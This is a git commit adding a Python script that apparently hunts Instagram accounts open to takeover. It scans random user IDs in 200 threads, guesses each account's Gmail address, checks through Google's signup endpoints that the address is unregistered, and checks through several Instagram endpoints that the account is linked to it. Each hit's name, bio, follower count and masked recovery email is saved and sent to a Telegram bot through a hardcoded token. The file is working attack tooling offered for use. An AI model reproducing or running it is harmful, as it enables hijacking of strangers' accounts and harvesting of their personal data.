f1e1e41ecb96a09060488e69fe95e17fcf4edfe3
hahyt6644-gif <hahyt6644@gmail.com>
2026-04-23 08:05:53 +0530

    Create tool.py

---
+++ tool.py
@@ -0,0 +1,179 @@
+E='\x1b[1;32m'
+G='\x1b[1;36m'
+Z='\x1b[1;31m'
+Q='\x1b[1;36m'
+X='\x1b[1;33m'
+Z1='\x1b[2;31m'
+F='\x1b[2;32m'
+A='\x1b[2;34m'
+C='\x1b[2;35m'
+B='\x1b[38;5;208m'
+Y='\x1b[1;34m'
+M='\x1b[1;37m'
+S='\x1b[1;33m'
+U='\x1b[1;37m'
+BRed='\x1b[1;31m'
+BGreen='\x1b[1;32m'
+BYellow='\x1b[1;33m'
+R='\x1b[1;34m'
+BPurple='\x1b[1;35m'
+BCyan='\x1b[1;36m'
+BWhite='\x1b[1;37m'
+BLUE='\x1b[94m'
+RESET='\x1b[0m'
+BOLD='\x1b[1m'
+YELLOW='\x1b[93m'
+RED='\x1b[91m'
+GREEN='\x1b[92m'
+CYAN='\x1b[96m'
+MAGENTA='\x1b[95m'
+import os,requests
+import Topython
+import random
+import requests
+import json
+import uuid
+import hashlib
+from fake_useragent import UserAgent
+import threading
+import sys
+import time
+import pycountry
+from secrets import token_hex
+from ms4 import InfoIG,RestInsta
+import os
+import string
+from queue import Queue
+from requests import get
+try:from user_agent import generate_user_agent
+except:os.system('pip install user_agent');from user_agent import generate_user_agent
+from time import time
+from hashlib import md5
+from random import randrange,choice
+import os
+hit_dustu=kotu_insta=orta_mail=0
+BLUE,RESET,BOLD,YELLOW,RED,GREEN,CYAN,MAGENTA='\x1b[94m','\x1b[0m','\x1b[1m','\x1b[93m','\x1b[91m','\x1b[92m','\x1b[96m','\x1b[95m'
+try:from cfonts import render
+except:os.system('pip install python-cfonts');from cfonts import render
+x7s1e=render('{meta}',colors=['white','blue'],align='center')
+print(f"""
+  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓   
+                      {x7s1e}
+    ~ Programmer : @xYourKing | Channel: @xPythonTools ~
+   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛    
+""")
+token="6124080980:AAF5YNhDWr6jMqQd-Kzf_0yzgwWJP2gCtGU"
+print('\x1b[1;39m—'*60)
+ID="5425526761"
+from requests import post as pp
+from user_agent import generate_user_agent as gg
+from random import choice as cc
+from random import randrange as rr
+import re
+yy='azertyuiopmlkjhgfdsqwxcvbn'
+ids=[]
+def tll():
+	try:
+		n1=''.join(cc(yy)for i in range(rr(6,9)));n2=''.join(cc(yy)for i in range(rr(3,9)));host=''.join(cc(yy)for i in range(rr(15,30)));he3={'accept':'*/*','accept-language':'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','sec-ch-ua':'"Not)A;Brand";v="24","Chromium";v="116"','sec-ch-ua-arch':'""','sec-ch-ua-bitness':'""','sec-ch-ua-full-version':'"116.0.5845.72"','sec-ch-ua-full-version-list':'"Not)A;Brand";v="24.0.0.0","Chromium";v="116.0.5845.72"','sec-ch-ua-mobile':'?1','sec-ch-ua-model':'"ANY-LX2"','sec-ch-ua-platform':'"Android"','sec-ch-ua-platform-version':'"13.0.0"','sec-ch-ua-wow64':'?0','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','x-chrome-connected':'source=Chrome,eligible_for_consistency=true','x-client-data':'CJjbygE=','x-same-domain':'1','Referrer-Policy':'strict-origin-when-cross-origin','user-agent':str(gg())};res1=requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',headers=he3);tok=re.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res1.text).group(2);cookies={'__Host-GAPS':host};headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp','user-agent':gg()};data={'f.req':'["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'};response=pp('https://accounts.google.com/_/signup/validatepersonaldetails',cookies=cookies,headers=headers,data=data);tl=str(response.text).split('",null,"')[1].split('"')[0];host=response.cookies.get_dict()['__Host-GAPS']
+		try:os.remove('tl.txt')
+		except:pass
+		with open('tl.txt','a')as f:f.write(tl+'//'+host+'\n')
+	except Exception as e:print(e);tll()
+tll()
+def check_gmail(email):
+	if'@'in email:email=str(email).split('@')[0]
+	try:
+		try:o=open('tl.txt','r').read().splitlines()[0]
+		except:tll();o=open('tl.txt','r').read().splitlines()[0]
+		tl,host=o.split('//');cookies={'__Host-GAPS':host};headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,'user-agent':gg()};params={'TL':tl};data='continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&';response=pp('https://accounts.google.com/_/signup/usernameavailability',params=params,cookies=cookies,headers=headers,data=data)
+		if'"gf.uar",1'in str(response.text):return'good'
+		elif'"er",null,null,null,null,400'in str(response.text):tll();check_gmail(email)
+		else:return'bad'
+	except:check_gmail(email)
+def rest(user):
+	try:headers={'X-Pigeon-Session-Id':'50cc6861-7036-43b4-802e-fb4282799c60','X-Pigeon-Rawclienttime':'1700251574.982','X-IG-Connection-Speed':'-1kbps','X-IG-Bandwidth-Speed-KBPS':'-1.000','X-IG-Bandwidth-TotalBytes-B':'0','X-IG-Bandwidth-TotalTime-MS':'0','X-Bloks-Version-Id':'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0','X-IG-Connection-Type':'WIFI','X-IG-Capabilities':'3brTvw==','X-IG-App-ID':'567067343352427','User-Agent':'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)','Accept-Language':'en-GB,en-US','Cookie':'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP;csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type':'application/x-www-form-urlencoded;charset=UTF-8','Accept-Encoding':'gzip,deflate','Host':'i.instagram.com','X-FB-HTTP-Engine':'Liger','Connection':'keep-alive','Content-Length':'356'};data={'signed_body':f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{user}","guid":"{user}","device_id":"{user}","query":"{user}"}}','ig_sig_key_version':'4'};response=requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).json();r=response.get('email',' h ')
+	except Exception as e:r=f" h "
+	return r
+def shelby_info(username,jj):
+	global hit_dustu;hit_dustu+=1
+	try:
+		urlg=f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}";he={'accept':'*/*','accept-encoding':'gzip, deflate, br','accept-language':'ar','cookie':'mid=YwxKOAABAAF8xQkXR4AGXYFuw6mH; ig did=F24F4904-C337-48E4-AB1B-16AF5D553AFD; ig nrcb=1; d pr=3; datr=CUsMY8Q04NPqGMvwze9WJVY2; shbid="4821 ,54664153777,1693612516:01f74576c1 35f7872 fb7 3886ff7479191 f1 a2dbcd8ca945a5b5128653 ccba468ed1e0311": shbts="166207651 6,546641 53777,1693612 516:01f7ecb709528c535487eb41 5ab771 2a01 bac5b97db1 740800a0c3d687a730cbd7e00135"; csrftoken=V9 FEMGcZB dh2UlbzDvSAM6aRj MqxzXjc','origin':'https://www.instagram.com','referer':'https://www.instagram.com/','sec-ch-ua':'"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-site','user-agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','x-asbd-id':'198387','x-csrftoken':'V9FEMGcZBdh2U1lbzDvsAM6aRjMqxzXjc','x-ig-app-id':'936619743392459','x-ig-www-claim':'0'};re=requests.get(urlg,headers=he).json();user_data=re.get('data',{}).get('user',{});biography=user_data.get('biography','N/A');follower_count=user_data.get('edge_followed_by',{}).get('count','N/A');following_count=user_data.get('edge_follow',{}).get('count','N/A');user_id=user_data.get('id','N/A');full_name=user_data.get('full_name','N/A');is_private=user_data.get('is_private','N/A');post_count=user_data.get('edge_owner_to_timeline_media',{}).get('count','N/A')
+		try:date_response=requests.get(f"https://o7aa.pythonanywhere.com/?id={user_id}");date=date_response.json().get('date','No date available')
+		except Exception as e:date='No date available'
+		reset_email=rest(username);porno=f"""
+_____________________        
+NAME : ﴾ {full_name} ﴿
+USERNAME : ﴾ @{username} ﴿ 
+EMAIL :  ﴾ {username}@gmail.com ﴿ 
+FOLLOWERS: ﴾ {follower_count} ﴿
+FOLLOWING : ﴾ {following_count} ﴿
+YEAR : ﴾ 2014 - 2015 ﴿
+ID  : ﴾ {user_id} ﴿        
+POST : ﴾ {post_count} ﴿
+BIO : ﴾ {biography} ﴿
+RESET :  {reset_email}
+LINK : https://www.instagram.com/{username}
+_____________________
+DEV : @xYourKing """;print(porno)
+		with open('meta-Hit.txt','a')as ff:ff.write(f"{porno}\n")
+		try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={porno}")
+		except Exception as e:print(f"  h ")
+	except:pass
+def x7s1e(email):
+	global orta_mail
+	try:
+		if'good'==check_gmail(email):username,jj=email.split('@');shelby_info(username,jj)
+		else:orta_mail+=1
+	except:''
+def xYourKing_user_agent():'Generate a random user agent string.';ii=['165.1.0.29.119','166.0.0.30.120','167.0.0.31.121','168.0.0.32.122'];aa={'28/9':['720dpi','1080dpi','1440dpi'],'29/10':['720dpi','1080dpi','1440dpi','2160dpi'],'30/11':['1080dpi','1440dpi','2160dpi'],'31/12':['1440dpi','2160dpi']};ss={'720dpi':['1280x720','1920x1080'],'1080dpi':['1920x1080','2560x1440','3840x2160'],'1440dpi':['2560x1440','3840x2160'],'2160dpi':['3840x2160','7680x4320']};dd={'samsung':['SM-T292','SM-G973F','SM-A515F'],'google':['Pixel 4','Pixel 5'],'huawei':['P30 Pro','Mate 40 Pro'],'xiaomi':['Mi 10','Redmi Note 10'],'oneplus':['8T','9 Pro'],'sony':['XZ2','Xperia 1']};cc=['qcom','exynos','kirin','mediatek','apple'];lan=['en_US','es_ES','fr_FR','de_DE','zh_CN','ja_JP','ko_KR'];dp=['phone','tablet','watch','tv','car'];arm=['arm64_v8a','armeabi-v7a','x86','x86_64'];comb=['samsung','google','huawei','xiaomi','oneplus','sony'];sos=random.choice(list(aa.keys()));vlo=random.choice(aa[sos]);lop=random.choice(ss[vlo]);ki=random.choice(comb);mo=random.choice(dd.get(ki,['Unknown']));user_agent=f"Instagram {random.choice(ii)} Android ({sos}; {vlo}; {lop}; {ki}; {mo}; {random.choice(arm)}; {random.choice(dp)}; {random.choice(lan)}; {random.choice(cc)})";return user_agent
+class Variable:country=[country.numeric for country in pycountry.countries];num=random.choice(country);sgin=hashlib.sha256(uuid.uuid4().hex.encode()).hexdigest();csr=str(token_hex(8)*2);android=f"android-{uuid.uuid4().hex[:16]}"
+variable_instance=Variable()
+def seks(email):
+	global kotu_insta,hit_dustu,orta_mail
+	try:
+		csrftoken=md5(str(time()).encode()).hexdigest();ua=generate_user_agent();pp=choice('01234');os.system('clear'if os.name=='posix'else'cls')
+		if pp=='0':
+			headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded','origin':'https://www.instagram.com','referer':'https://www.instagram.com/accounts/signup/email/','user-agent':ua,'x-csrftoken':csrftoken};data={'email':email};response=requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/',headers=headers,data=data)
+			if'email_is_taken'in str(response.text):x7s1e(email)
+			else:kotu_insta+=1
+		elif pp=='1':
+			headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded','origin':'https://www.instagram.com','referer':'https://www.instagram.com/?lang=en-US&hl=en-gb','user-agent':ua,'x-csrftoken':csrftoken};data={'username':email};response=requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',headers=headers,data=data).text
+			if'"user":true'in response:x7s1e(email)
+			else:kotu_insta+=1
+		elif pp=='2':
+			device_id='android-'+hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16];uui=str(uuid.uuid4());headers={'User-Agent':ua,'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'};cookies={'csrftoken':'76HKvZYXiWJKIArQAQNEMD'};data={'signed_body':'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'+json.dumps({'_csrftoken':'76HKvZYXiWJKIArQAQNEMD','adid':uui,'guid':uui,'device_id':device_id,'query':email}),'ig_sig_key_version':'4'};response=requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,cookies=cookies,data=data).text
+			if email in response:x7s1e(email)
+			else:kotu_insta+=1
+		elif pp=='3':
+			url='https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.caa.ar.search.async/';payload=f"params=%7B%22client_input_params%22%3A%7B%22text_input_id%22%3A%22616z6k%3A71%22%2C%22was_headers_prefill_available%22%3A0%2C%22sfdid%22%3A%22%22%2C%22fetched_email_token_list%22%3A%7B%7D%2C%22search_query%22%3A%22{email}%22%2C%22android_build_type%22%3A%22release%22%2C%22accounts_list%22%3A%5B%5D%2C%22ig_android_qe_device_id%22%3A%228745a4a2-a663-4bc7-9b3b-16d5b8ea20b9%22%2C%22ig_oauth_token%22%3A%5B%5D%2C%22is_whatsapp_installed%22%3A1%2C%22lois_settings%22%3A%7B%22lois_token%22%3A%22%22%2C%22lara_override%22%3A%22%22%7D%7D%7D";headers={'User-Agent':xYourKing_user_agent(),'x-ig-app-locale':'en-US','x-ig-device-locale':'en-US','x-ig-mapped-locale':'en-US','x-pigeon-session-id':str(uuid.uuid4()),'x-pigeon-rawclienttime':str('{:.3f}'.format(time.time())),'x-ig-bandwidth-speed-kbps':'-1.000','x-ig-bandwidth-totalbytes-b':'0','x-ig-bandwidth-totaltime-ms':'0','x-ig-connection-type':'MOBILE(LTE)','x-ig-capabilities':'3brTv10=','x-ig-app-id':'567067343352427','priority':'u=3','accept-language':'en-US','content-type':'application/x-www-form-urlencoded'};response=requests.post(url,data=payload,headers=headers)
+			if response.status_code==200:
+				response_data=response.json()
+				if'The password you entered is incorrect.'in str(response_data):x7s1e(email)
+				else:kotu_insta+=1
+		elif pp=='4':
+			url='https://i.instagram.com/api/v1/users/lookup/';payload=f"signed_body={Variable.sgin}.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%22{Variable.num}%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22_csrftoken%22%3A%22{Variable.csr}%22%2C%22q%22%3A%22{email}%22%2C%22guid%22%3A%22{uuid.uuid4()}%22%2C%22device_id%22%3A%22{Variable.android}%22%2C%22directly_sign_in%22%3A%22true%22%7D&ig_sig_key_version=4";headers={'User-Agent':xYourKing_user_agent(),'Accept-Encoding':'gzip, deflate','Content-Type':'application/x-www-form-urlencoded','X-Pigeon-Session-Id':str(uuid.uuid4()),'X-Pigeon-Rawclienttime':str('{:.3f}'.format(time.time())),'X-IG-Connection-Speed':'-1kbps','X-IG-Bandwidth-Speed-KBPS':'-1.000','X-IG-Bandwidth-TotalBytes-B':'0','X-IG-Bandwidth-TotalTime-MS':'0','X-IG-Connection-Type':'MOBILE(LTE)','X-IG-Capabilities':'3brTvw==','X-IG-App-ID':'567067343352427','Accept-Language':'ar-YE, en-US','X-FB-HTTP-Engine':'Liger'};res=requests.post(url,data=payload,headers=headers).text
+			if'"status":"ok"'in res and f"{email}"in res:x7s1e(email)
+			else:kotu_insta+=1
+	except:pass
+	os.system('clear'if os.name=='posix'else'cls');print(f"""
+ ___________________________________
+[ 1 ] HIT ✅  : [ {hit_dustu} ] 
+[ 2 ] BAD INSTAGRAM : [ {kotu_insta} ] 
+[ 3 ] BAD EMAIL : [ {orta_mail} ] 
+[ 4 ] EMAIL : [ {email} ]
+___________________________________""")
+import requests
+from random import choice,randrange
+from threading import Thread
+from user_agent import generate_user_agent
+def ayr_takipc(username,follower_count):
+	if follower_count>=40:pass
+def x7s1evipfree():
+	while True:
+		try:
+			id=str(random.randint(10000000,21254029834));rnd=str(random.randint(150,999));user_agent='Instagram 311.0.0.32.118 Android ('+['23/6.0','24/7.0','25/7.1.1','26/8.0','27/8.1','28/9.0'][random.randint(0,5)]+'; '+str(random.randint(100,1300))+'dpi; '+str(random.randint(200,2000))+'x'+str(random.randint(200,2000))+'; '+['SAMSUNG','HUAWEI','LGE/lge','HTC','ASUS','ZTE','ONEPLUS','XIAOMI','OPPO','VIVO','SONY','REALME'][random.randint(0,11)]+'; SM-T'+rnd+'; SM-T'+rnd+'; qcom; en_US; 545986'+str(random.randint(111,999))+')';lsd=''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')for _ in range(32));headers={'accept':'*/*','accept-language':'en,en-US;q=0.9','content-type':'application/x-www-form-urlencoded','dnt':'1','origin':'https://www.instagram.com','priority':'u=1, i','referer':'https://www.instagram.com/cristiano/following/','user-agent':user_agent,'x-fb-friendly-name':'PolarisUserHoverCardContentV2Query','x-fb-lsd':lsd};data={'lsd':lsd,'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'PolarisUserHoverCardContentV2Query','variables':json.dumps({'userID':id,'username':'cristiano'}),'server_timestamps':'true','doc_id':'7717269488336001'};response=requests.post('https://www.instagram.com/api/graphql',headers=headers,data=data);response_json=response.json();follower_count=response_json.get('data',{}).get('user',{}).get('follower_count',0);username=response_json.get('data',{}).get('user',{}).get('username',None)
+			if follower_count>=40 and username:email=username+'@gmail.com';seks(email)
+		except Exception as e:continue
+threads=[]
+for _ in range(200):t=Thread(target=x7s1evipfree);t.start();threads.append(t)
+for t in threads:t.join()
